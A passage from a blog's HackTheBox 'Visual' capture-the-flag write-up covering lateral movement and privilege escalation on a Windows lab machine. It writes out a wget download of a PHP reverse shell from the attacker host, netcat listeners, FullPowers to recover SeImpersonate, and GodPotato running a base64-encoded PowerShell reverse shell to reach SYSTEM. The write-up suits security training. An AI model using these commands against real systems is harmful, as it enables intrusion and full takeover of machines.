+</div><h2 id="lateral-movement">Lateral Movement</h2>
+<p>After some enumeration, there isn&rsquo;t much to be done with user <code>enox</code>, so I decide to insert a php reverse shell into the webroot directory. For Windows machines, service accounts will very commonly have the <code>SeImpersonate</code> privilege, which can be used in a potato attack to reach <code>NT Authority/SYSTEM</code> level privileges. The reverse shell used was obtained from <a class="link" href="https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master"  target="_blank" rel="noopener"
+    >https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\xampp\htdocs&gt; wget 10.10.14.134/rev.php -outfile rev.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now upon visiting the page at <code>http://10.10.139.209/rev.php</code>, we receive a connection back:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/visual]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 443
+</span></span><span class="line"><span class="cl">listening on [any] 443 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.145.35] 49674
+</span></span><span class="line"><span class="cl">b374k shell : connected
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.4840]
+</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\temp2&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority\local service
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are now <code>NT Authority\local service</code>, but unfortunately this does not have the same powers as <code>NT Authority\System</code>. In addition to low filesystem permissions, we have very limited privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users&gt;whoami /priv
+</span></span><span class="line"><span class="cl">whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                    State   
+</span></span><span class="line"><span class="cl">============================= ============================== ========
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       Create global objects          Enabled 
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Fortunately, there is a way to improve our privilege access. <a class="link" href="https://github.com/itm4n/FullPowers"  target="_blank" rel="noopener"
+    >FullPowers</a> is a tool we can use to recover the default privilege set of a service account, including SeImpersonate privilege. If we acquire this, we can launch a potato-style attack. Using FullPowers.exe:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp2&gt;.\FullPowers.exe
+</span></span><span class="line"><span class="cl">.\FullPowers.exe
+</span></span><span class="line"><span class="cl">[+] Started dummy thread with id 2444
+</span></span><span class="line"><span class="cl">[+] Successfully created scheduled task.
+</span></span><span class="line"><span class="cl">[+] Got new token! Privilege count: 7
+</span></span><span class="line"><span class="cl">[+] CreateProcessAsUser() OK
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 10.0.17763.4851]
+</span></span><span class="line"><span class="cl">(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Windows\system32&gt;whoami /priv
+</span></span><span class="line"><span class="cl">whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                               State  
+</span></span><span class="line"><span class="cl">============================= ========================================= =======
+</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+</span></span><span class="line"><span class="cl">SeAuditPrivilege              Generate security audits                  Enabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After launching, SeImpersonatePrivilege is now present, and we can achieve full system compromise through <a class="link" href="https://github.com/BeichenDream/GodPotato"  target="_blank" rel="noopener"
+    >GodPotato</a>.
+Using GodPotato.exe, I execute a <code>bat</code> file consisting of a base64-encoded reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp2&gt;.\gp.exe -cmd &#34;C:\temp2\rev.bat&#34;
+</span></span><span class="line"><span class="cl">.\gp.exe -cmd &#34;C:\temp2\rev.bat&#34;
+</span></span><span class="line"><span class="cl">[*] CombaseModule: 0x140705454620672
+</span></span><span class="line"><span class="cl">[*] DispatchTable: 0x140705456926832
+</span></span><span class="line"><span class="cl">[*] UseProtseqFunction: 0x140705456303008
+</span></span><span class="line"><span class="cl">[*] UseProtseqFunctionParamCount: 6
+</span></span><span class="line"><span class="cl">[*] HookRPC
+</span></span><span class="line"><span class="cl">[*] Start PipeServer
+</span></span><span class="line"><span class="cl">[*] Trigger RPCSS
+</span></span><span class="line"><span class="cl">[*] CreateNamedPipe \\.\pipe\2d864ad4-a01d-4f46-a771-5551b936f542\pipe\epmapper
+</span></span><span class="line"><span class="cl">[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+</span></span><span class="line"><span class="cl">[*] DCOM obj IPID: 00008402-1318-ffff-b73e-c6eaecf7b199
+</span></span><span class="line"><span class="cl">[*] DCOM obj OXID: 0xa2eebb464a7a9dc0
+</span></span><span class="line"><span class="cl">[*] DCOM obj OID: 0x1b73e71602e012f3
+</span></span><span class="line"><span class="cl">[*] DCOM obj Flags: 0x281
+</span></span><span class="line"><span class="cl">[*] DCOM obj PublicRefs: 0x0
+</span></span><span class="line"><span class="cl">[*] Marshal Object bytes len: 100
+</span></span><span class="line"><span class="cl">[*] UnMarshal Object
+</span></span><span class="line"><span class="cl">[*] Pipe Connected!
+</span></span><span class="line"><span class="cl">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+</span></span><span class="line"><span class="cl">[*] CurrentsImpersonationLevel: Impersonation
+</span></span><span class="line"><span class="cl">[*] Start Search System Token
+</span></span><span class="line"><span class="cl">[*] PID : 872 Token:0x800  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+</span></span><span class="line"><span class="cl">[*] Find System Token : True
+</span></span><span class="line"><span class="cl">[*] UnmarshalObject: 0x80070776
+</span></span><span class="line"><span class="cl">[*] CurrentUser: NT AUTHORITY\SYSTEM
+</span></span><span class="line"><span class="cl">[*] process start with pid 3388
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\temp2&gt;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQ&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 443
+</span></span><span class="line"><span class="cl">listening on [any] 443 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.134] from (UNKNOWN) [10.129.145.35] 49681
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority\system
+</span></span><span class="line"><span class="cl">PS C:\temp2&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we have full access to the system.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/gitea/">Gitea</a>
+        
+            <a href="/tags/visual-studio/">Visual Studio</a>
+        
+            <a href="/tags/fullpowers/">FullPowers</a>
+        
+            <a href="/tags/godpotato/">GodPotato</a>
+        
+            <a href="/tags/dotnet/">Dotnet</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-drive/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-drive/Drive.0a2a46fe54b3fb58a269f4b35b5ab403_hu501960eeac16eccd918d7d9edf7f2484_365098_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Drive"
+                        
+                        data-hash="md5-CipG/lSz&#43;1iiafSzW1q0Aw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Drive</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-mailroom/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu83fa4872cdc769af1a6c4264f0edd42d_354362_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Mailroom"
+                        
+                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Mailroom</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-busqueda/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-busqueda/Busqueda.fc4856cd6b9e5aa954d7face3968a69d_hucd7cd900a381e6f396b4d3fd74d99876_352215_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Busqueda"
+                        
+                        data-hash="md5-/EhWzWueWqlU1/rOOWimnQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Busqueda</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-keeper/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-keeper/Keeper.db5cf5b8b8e56b176ddbf7cd17f23a95_huf4f9f9df27aef9cdcea61ade0795a679_239964_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Keeper"
+                        
+                        data-hash="md5-21z1uLjlaxdt2/fNF/I6lQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Keeper</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-sau/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu395bd5edbfd24d434ffdbc0f1375eb9f_446175_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Sau"
+                        
+                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Sau</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2023 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#troubleshooting-the-git-repo-building">Troubleshooting the Git Repo building</a>
+          <ol>
+            <li><a href="#setting-up-a-self-hosted-gitea-server">Setting up a self-hosted Gitea server</a></li>
+            <li><a href="#supplying-a-visual-studio-project">Supplying a Visual Studio project</a></li>
+            <li><a href="#creating-a-simple-dotnet-project">Creating a simple dotnet project</a></li>
+          </ol>
+        </li>
+        <li><a href="#exploiting-vss-pre-build-event">Exploiting VS&rsquo;s pre-build event</a></li>
+      </ol>
+    </li>
+    <li><a href="#lateral-movement">Lateral Movement</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
